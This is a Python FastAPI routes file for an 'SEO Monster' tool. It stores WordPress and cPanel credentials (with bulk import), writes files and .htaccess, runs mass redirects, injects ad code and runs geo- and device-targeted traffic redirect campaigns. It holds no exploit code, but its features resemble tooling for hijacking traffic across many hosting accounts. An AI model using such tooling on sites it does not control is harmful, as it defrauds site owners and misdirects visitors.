"""
SEO Monster - Hosting API Routes
API для WordPress, cPanel и Traffic Redirector
"""

from fastapi import APIRouter, HTTPException, UploadFile, File
from pydantic import BaseModel
from typing import List, Optional, Dict
import json

from services.wordpress_manager import get_wordpress_manager
from services.cpanel_manager import get_cpanel_manager
from services.traffic_redirector import get_traffic_redirector

router = APIRouter(prefix="/api/hosting", tags=["Hosting"])


# ═══════════════════════════════════════════════════════════════
# МОДЕЛИ
# ═══════════════════════════════════════════════════════════════

class WPSiteCreate(BaseModel):
    name: str
    url: str
    username: str
    password: str
    app_password: Optional[str] = None
    connection_type: str = "rest_api"

class WPSiteUpdate(BaseModel):
    name: Optional[str] = None
    target_domains: Optional[List[str]] = None
    ad_enabled: Optional[bool] = None
    auto_content: Optional[bool] = None

class WPPostCreate(BaseModel):
    title: str
    content: str
    status: str = "publish"
    categories: Optional[List[int]] = None

class CPanelAccountCreate(BaseModel):
    name: str
    hostname: str
    username: str
    password: str
    port: int = 2083
    api_token: Optional[str] = None
    document_root: str = "/public_html"

class HtaccessApply(BaseModel):
    template_id: str
    variables: Dict[str, str]
    path: str = "/public_html"
    append: bool = True

class RedirectSetup(BaseModel):
    target_url: str
    redirect_type: str = "301"
    path: str = "/public_html"

class CampaignCreate(BaseModel):
    name: str
    source_type: str  # wordpress, cpanel, both
    source_ids: List[str]
    target_urls: List[str]
    redirect_type: str = "301"
    rotation_mode: str = "single"
    weights: Optional[Dict[str, int]] = None
    geo_targeting: Optional[Dict[str, str]] = None
    device_targeting: Optional[Dict[str, str]] = None

class BulkImport(BaseModel):
    data: str
    format_type: str = "txt"

class ContentTemplateCreate(BaseModel):
    name: str
    content_type: str
    template: str
    variables: Dict[str, str]
    redirect_url: Optional[str] = None
    ad_code: Optional[str] = None


# ═══════════════════════════════════════════════════════════════
# WORDPRESS API
# ═══════════════════════════════════════════════════════════════

@router.get("/wordpress/sites")
async def get_wp_sites(status: Optional[str] = None):
    """Получение списка WordPress сайтов"""
    wp = get_wordpress_manager()
    return {"sites": wp.get_sites(status)}

@router.post("/wordpress/sites")
async def add_wp_site(site: WPSiteCreate):
    """Добавление WordPress сайта"""
    wp = get_wordpress_manager()
    return wp.add_site(
        name=site.name,
        url=site.url,
        username=site.username,
        password=site.password,
        app_password=site.app_password,
        connection_type=site.connection_type
    )

@router.post("/wordpress/sites/import")
async def import_wp_sites(data: BulkImport):
    """Массовый импорт WordPress сайтов"""
    wp = get_wordpress_manager()
    return wp.import_sites_bulk(data.data, data.format_type)

@router.get("/wordpress/sites/{site_id}")
async def get_wp_site(site_id: str):
    """Получение информации о сайте"""
    wp = get_wordpress_manager()
    site = wp.get_site(site_id)
    if not site:
        raise HTTPException(status_code=404, detail="Сайт не найден")
    return site

@router.put("/wordpress/sites/{site_id}")
async def update_wp_site(site_id: str, site: WPSiteUpdate):
    """Обновление сайта"""
    wp = get_wordpress_manager()
    return wp.update_site(site_id, **site.dict(exclude_none=True))

@router.delete("/wordpress/sites/{site_id}")
async def delete_wp_site(site_id: str):
    """Удаление сайта"""
    wp = get_wordpress_manager()
    return wp.delete_site(site_id)

@router.post("/wordpress/sites/{site_id}/test")
async def test_wp_connection(site_id: str):
    """Проверка подключения к сайту"""
    wp = get_wordpress_manager()
    return await wp.test_connection(site_id)

@router.post("/wordpress/sites/{site_id}/sync")
async def sync_wp_site(site_id: str):
    """Синхронизация данных сайта"""
    wp = get_wordpress_manager()
    return await wp.sync_site(site_id)

@router.get("/wordpress/sites/{site_id}/posts")
async def get_wp_posts(site_id: str, per_page: int = 10, page: int = 1):
    """Получение постов сайта"""
    wp = get_wordpress_manager()
    return await wp.get_posts(site_id, per_page, page)

@router.post("/wordpress/sites/{site_id}/posts")
async def create_wp_post(site_id: str, post: WPPostCreate):
    """Создание поста"""
    wp = get_wordpress_manager()
    return await wp.create_post(
        site_id=site_id,
        title=post.title,
        content=post.content,
        status=post.status,
        categories=post.categories
    )

@router.put("/wordpress/sites/{site_id}/posts/{post_id}")
async def update_wp_post(site_id: str, post_id: int, post: WPPostCreate):
    """Обновление поста"""
    wp = get_wordpress_manager()
    return await wp.update_post(
        site_id=site_id,
        post_id=post_id,
        title=post.title,
        content=post.content,
        status=post.status
    )

@router.delete("/wordpress/sites/{site_id}/posts/{post_id}")
async def delete_wp_post(site_id: str, post_id: int, force: bool = False):
    """Удаление поста"""
    wp = get_wordpress_manager()
    return await wp.delete_post(site_id, post_id, force)

@router.post("/wordpress/sites/{site_id}/apply-template/{template_id}")
async def apply_wp_template(site_id: str, template_id: str, 
                           variables: Optional[Dict[str, str]] = None):
    """Применение шаблона контента к сайту"""
    wp = get_wordpress_manager()
    return await wp.apply_template_to_site(site_id, template_id, variables)

@router.post("/wordpress/sites/{site_id}/mass-update/{template_id}")
async def mass_update_wp_content(site_id: str, template_id: str):
    """Массовое обновление контента на сайте"""
    wp = get_wordpress_manager()
    return await wp.mass_update_content(site_id, template_id)

@router.post("/wordpress/sites/{site_id}/inject-ads/{ad_id}")
async def inject_wp_ads(site_id: str, ad_id: str, position: str = "top"):
    """Внедрение рекламы на сайт"""
    wp = get_wordpress_manager()
    return await wp.inject_ads_to_site(site_id, ad_id, position)

# Шаблоны контента
@router.get("/wordpress/templates")
async def get_wp_templates():
    """Получение шаблонов контента"""
    wp = get_wordpress_manager()
    return {"templates": wp.get_content_templates()}

@router.post("/wordpress/templates")
async def create_wp_template(template: ContentTemplateCreate):
    """Создание шаблона контента"""
    wp = get_wordpress_manager()
    return wp.add_content_template(
        name=template.name,
        content_type=template.content_type,
        template=template.template,
        variables=template.variables,
        redirect_url=template.redirect_url,
        ad_code=template.ad_code
    )

# Рекламные блоки
@router.get("/wordpress/ads")
async def get_wp_ads():
    """Получение рекламных блоков"""
    wp = get_wordpress_manager()
    return {"ads": wp.get_ad_blocks()}

@router.post("/wordpress/ads")
async def create_wp_ad(name: str, code: str):
    """Создание рекламного блока"""
    wp = get_wordpress_manager()
    return wp.add_ad_block(name, code)

@router.get("/wordpress/stats")
async def get_wp_stats():
    """Статистика WordPress"""
    wp = get_wordpress_manager()
    return wp.get_stats()


# ═══════════════════════════════════════════════════════════════
# CPANEL API
# ═══════════════════════════════════════════════════════════════

@router.get("/cpanel/accounts")
async def get_cpanel_accounts(status: Optional[str] = None):
    """Получение списка cPanel аккаунтов"""
    cp = get_cpanel_manager()
    return {"accounts": cp.get_accounts(status)}

@router.post("/cpanel/accounts")
async def add_cpanel_account(account: CPanelAccountCreate):
    """Добавление cPanel аккаунта"""
    cp = get_cpanel_manager()
    return cp.add_account(
        name=account.name,
        hostname=account.hostname,
        username=account.username,
        password=account.password,
        port=account.port,
        api_token=account.api_token,
        document_root=account.document_root
    )

@router.post("/cpanel/accounts/import")
async def import_cpanel_accounts(data: BulkImport):
    """Массовый импорт cPanel аккаунтов"""
    cp = get_cpanel_manager()
    return cp.import_accounts_bulk(data.data, data.format_type)

@router.delete("/cpanel/accounts/{account_id}")
async def delete_cpanel_account(account_id: str):
    """Удаление аккаунта"""
    cp = get_cpanel_manager()
    return cp.delete_account(account_id)

@router.post("/cpanel/accounts/{account_id}/test")
async def test_cpanel_connection(account_id: str):
    """Проверка подключения к cPanel"""
    cp = get_cpanel_manager()
    return await cp.test_connection(account_id)

@router.get("/cpanel/accounts/{account_id}/files")
async def list_cpanel_files(account_id: str, path: str = "/public_html"):
    """Список файлов"""
    cp = get_cpanel_manager()
    return await cp.list_files(account_id, path)

@router.get("/cpanel/accounts/{account_id}/file")
async def read_cpanel_file(account_id: str, file_path: str):
    """Чтение файла"""
    cp = get_cpanel_manager()
    return await cp.read_file(account_id, file_path)

@router.post("/cpanel/accounts/{account_id}/file")
async def write_cpanel_file(account_id: str, file_path: str, content: str):
    """Запись в файл"""
    cp = get_cpanel_manager()
    return await cp.write_file(account_id, file_path, content)

@router.get("/cpanel/accounts/{account_id}/htaccess")
async def get_cpanel_htaccess(account_id: str, path: str = "/public_html"):
    """Получение .htaccess"""
    cp = get_cpanel_manager()
    return await cp.get_htaccess(account_id, path)

@router.post("/cpanel/accounts/{account_id}/htaccess")
async def update_cpanel_htaccess(account_id: str, content: str, 
                                path: str = "/public_html"):
    """Обновление .htaccess"""
    cp = get_cpanel_manager()
    return await cp.update_htaccess(account_id, content, path)

@router.post("/cpanel/accounts/{account_id}/htaccess/template")
async def apply_cpanel_htaccess_template(account_id: str, data: HtaccessApply):
    """Применение шаблона .htaccess"""
    cp = get_cpanel_manager()
    return await cp.apply_htaccess_template(
        account_id=account_id,
        template_id=data.template_id,
        variables=data.variables,
        path=data.path,
        append=data.append
    )

@router.post("/cpanel/accounts/{account_id}/redirect")
async def setup_cpanel_redirect(account_id: str, data: RedirectSetup):
    """Настройка редиректа"""
    cp = get_cpanel_manager()
    return await cp.setup_redirect(
        account_id=account_id,
        target_url=data.target_url,
        redirect_type=data.redirect_type,
        path=data.path
    )

@router.post("/cpanel/mass-redirect")
async def setup_cpanel_mass_redirect(account_ids: List[str], 
                                    target_url: str,
                                    redirect_type: str = "301"):
    """Массовая настройка редиректов"""
    cp = get_cpanel_manager()
    return await cp.setup_mass_redirect(account_ids, target_url, redirect_type)

@router.get("/cpanel/accounts/{account_id}/databases")
async def list_cpanel_databases(account_id: str):
    """Список баз данных"""
    cp = get_cpanel_manager()
    return await cp.list_databases(account_id)

@router.get("/cpanel/accounts/{account_id}/subdomains")
async def list_cpanel_subdomains(account_id: str):
    """Список поддоменов"""
    cp = get_cpanel_manager()
    return await cp.list_subdomains(account_id)

@router.get("/cpanel/htaccess-templates")
async def get_cpanel_htaccess_templates():
    """Получение шаблонов .htaccess"""
    cp = get_cpanel_manager()
    return {"templates": cp.get_htaccess_templates()}

@router.post("/cpanel/htaccess-templates")
async def add_cpanel_htaccess_template(template_id: str, name: str, template: str):
    """Добавление шаблона .htaccess"""
    cp = get_cpanel_manager()
    return cp.add_htaccess_template(template_id, name, template)

@router.get("/cpanel/stats")
async def get_cpanel_stats():
    """Статистика cPanel"""
    cp = get_cpanel_manager()
    return cp.get_stats()


# ═══════════════════════════════════════════════════════════════
# TRAFFIC REDIRECTOR API
# ═══════════════════════════════════════════════════════════════

@router.get("/traffic/campaigns")
async def get_traffic_campaigns(status: Optional[str] = None):
    """Получение списка кампаний"""
    tr = get_traffic_redirector()
    return {"campaigns": tr.get_campaigns(status)}

@router.post("/traffic/campaigns")
async def create_traffic_campaign(campaign: CampaignCreate):
    """Создание кампании редиректов"""
    tr = get_traffic_redirector()
    return tr.create_campaign(
        name=campaign.name,
        source_type=campaign.source_type,
        source_ids=campaign.source_ids,
        target_urls=campaign.target_urls,
        redirect_type=campaign.redirect_type,
        rotation_mode=campaign.rotation_mode,
        weights=campaign.weights,
        geo_targeting=campaign.geo_targeting,
        device_targeting=campaign.device_targeting
    )

@router.get("/traffic/campaigns/{campaign_id}")
async def get_traffic_campaign(campaign_id: str):
    """Получение информации о кампании"""
    tr = get_traffic_redirector()
    campaign = tr.get_campaign(campaign_id)
    if not campaign:
        raise HTTPException(status_code=404, detail="Кампания не найдена")
    return campaign

@router.delete("/traffic/campaigns/{campaign_id}")
async def delete_traffic_campaign(campaign_id: str):
    """Удаление кампании"""
    tr = get_traffic_redirector()
    return tr.delete_campaign(campaign_id)

@router.post("/traffic/campaigns/{campaign_id}/apply")
async def apply_traffic_campaign(campaign_id: str):
    """Применение кампании"""
    tr = get_traffic_redirector()
    return await tr.apply_campaign(campaign_id)

@router.post("/traffic/campaigns/{campaign_id}/remove")
async def remove_traffic_campaign(campaign_id: str):
    """Удаление редиректов кампании"""
    tr = get_traffic_redirector()
    return await tr.remove_campaign_redirects(campaign_id)

@router.get("/traffic/campaigns/{campaign_id}/code")
async def get_traffic_campaign_code(campaign_id: str, code_type: Optional[str] = None):
    """Получение кода редиректа"""
    tr = get_traffic_redirector()
    return tr.generate_redirect_code(campaign_id, code_type)

@router.get("/traffic/campaigns/{campaign_id}/stats")
async def get_traffic_campaign_stats(campaign_id: str, days: int = 7):
    """Статистика кампании"""
    tr = get_traffic_redirector()
    return tr.get_campaign_stats(campaign_id, days)

@router.get("/traffic/stats")
async def get_traffic_overall_stats():
    """Общая статистика трафика"""
    tr = get_traffic_redirector()
    return tr.get_overall_stats()

@router.get("/traffic/target-url/{campaign_id}")
async def get_target_url(campaign_id: str, 
                        geo: Optional[str] = None,
                        device: Optional[str] = None):
    """Получение целевого URL (для внешних систем)"""
    tr = get_traffic_redirector()
    url = tr.get_target_url(campaign_id, geo, device)
    if not url:
        raise HTTPException(status_code=404, detail="URL не найден")
    
    # Записываем клик
    tr.record_click(campaign_id, geo=geo, device=device, target_url=url)
    
    return {"url": url}


# ═══════════════════════════════════════════════════════════════
# ОБЩАЯ СТАТИСТИКА
# ═══════════════════════════════════════════════════════════════

@router.get("/stats")
async def get_hosting_stats():
    """Общая статистика по всем модулям"""
    wp = get_wordpress_manager()
    cp = get_cpanel_manager()
    tr = get_traffic_redirector()
    
    return {
        "wordpress": wp.get_stats(),
        "cpanel": cp.get_stats(),
        "traffic": tr.get_overall_stats()
    }
